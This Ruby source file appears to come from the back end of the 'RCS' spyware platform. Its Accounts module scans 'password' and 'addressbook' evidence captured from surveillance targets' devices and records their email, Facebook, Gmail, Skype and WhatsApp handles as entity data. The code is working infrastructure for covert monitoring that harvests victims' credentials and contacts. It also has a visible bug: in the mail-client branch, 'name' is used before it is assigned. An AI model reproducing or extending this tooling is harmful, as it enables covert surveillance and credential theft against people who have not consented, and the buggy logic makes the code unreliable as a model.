#
#  Module for retrieving the accounts of the targets
#

require 'mail'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Accounts
  include Tracer
  extend Tracer

  @@running = false

  class << self

    ADDRESSBOOK_TYPE = [:facebook, :twitter, :gmail, :skype, :bbm, :whatsapp, :phone, :mail, :linkedin]

    def retrieve
      # avoid two thread at the same time
      # we are called by the eventmachine reactor
      if @@running
        trace :debug, "Account retrieval already running, skipping..."
        return
      end

      @@running = true

      count = ::Item.targets.count
      trace :debug, "Retrieving accounts for #{count} targets"

      ::Item.targets.each do |target|

        # retrieve the entity of this target
        entity = ::Entity.targets.also_in(path: [target[:_id]]).first

        # skip if there's nothing new to analyze
        next if entity[:analyzed]['handles']

        trace :info, "Analyzing entity #{entity.name} for new handles"

        last = entity[:analyzed]['handles_last']

        # passwords parsing
        # here we extract every account that seems an email address
        Evidence.collection_class(target[:_id]).where({type: 'password', :da.gt => last}).each do |ev|
          add_handle(entity, ev[:data])
          last = ev.da if ev.da > last
        end

        # addressbook
        # here we extract every account marked as "local" by the addressbook module
        Evidence.collection_class(target[:_id]).where({type: 'addressbook', 'data.type' => :target, :da.gt => last}).each do |ev|
          add_handle(entity, ev[:data])
          last = ev.da if ev.da > last
        end

        # mark it as analyzed
        entity[:analyzed] = {'handles' => true, 'handles_last' => last}
        entity.save
      end

    ensure
      @@running = false
    end

    def add_handle(entity, data)

      trace :debug, "Parsing handle data: #{data.inspect}"

      # target account in the contacts (addressbook)
      if ADDRESSBOOK_TYPE.include? data['program']
        unless data['info'].length == 0
          type = data['program']
          handle = data['info']
          handle = handle.split(':')[1].chomp.strip if handle[":"]
          create_entity_handle(entity, :automatic, type, handle, data['name'])
        end
      elsif data['program'] =~ /outlook|mail/i
        # mail accounts from email clients saving account to the device
        handle = data['user']
        add_domain(name, data['service'])
        type = get_type(name, data['service'])
        create_entity_handle(entity, :automatic, type, handle, '') if is_mail?(name)
      end

      # infer on the user to discover email addresses (for passwords)
      if data['user']
        name = data['user']
        add_domain(name, data['service'])
        type = get_type(name, data['service'])
        create_entity_handle(entity, :automatic, type, name, '') if is_mail?(name)
      end
    rescue Exception => e
      trace :error, "Cannot add handle: " + e.message
      trace :fatal, e.backtrace.join("\n")
    end

    def create_entity_handle(entity, level, type, handle, name)
      # don't add if already exist
      return if entity.handles.where({type: type, name: name, handle: handle}).count != 0

      # update the name if the handle is already present
      entity.handles.where({type: type, level: level, handle: handle}).each do |h|
        trace :info, "Modifying handle [#{type}, #{handle}, #{name}] on entity: #{entity.name}"
        h.name = name
        h.save
        return
      end

      trace :info, "Adding handle [#{type}, #{handle}, #{name}] to entity: #{entity.name}"

      # add to the list of handles
      entity.handles.create!(level: level, type: type, name: name, handle: handle)
    end

    def is_mail?(value)
      return false if value == ''
      parsed = Mail::Address.new(value)
      return parsed.address == value && parsed.local != parsed.address
    rescue Mail::Field::ParseError
      return false
    end

    def add_domain(user, service)
      user << '@gmail.com' if service =~ /gmail|google/i and not is_mail?(user)
      user << '@hotmail.com' if service =~ /hotmail/i and not is_mail?(user)
      user << '@facebook.com' if service =~ /facebook/i and not is_mail?(user)
    end

    def get_type(user, service)

      trace :debug, "get_type #{user} #{service}"

      #if already in email form, check the domain, else check the service
      to_search = is_mail?(user) ? user : service

      case to_search
        when /gmail/i
          return :gmail
        when /facebook/i
          return :facebook
      end

      return :mail
    end

  end

end

end
end

